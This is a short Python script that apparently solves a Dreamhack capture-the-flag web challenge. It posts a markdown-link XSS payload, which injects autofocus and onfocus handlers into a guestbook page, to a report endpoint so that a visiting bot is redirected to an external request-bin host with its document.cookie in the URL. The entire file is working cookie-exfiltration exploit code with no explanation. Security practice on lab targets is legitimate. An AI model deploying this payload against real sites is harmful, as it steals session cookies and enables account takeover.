import requests
from urllib.parse import quote

url = "http://host3.dreamhack.games:19562/"
s = requests.Session()

payload = '''[a](' autofocus onfocus=location.href=`https://xhztpui.request.dreamhack.games?e=${document.cookie}` ')'''

res = requests.post(f'{url}/Report.php', data={
    'path': f'/GuestBook.php?content={quote(payload)}'
})

print(res.text)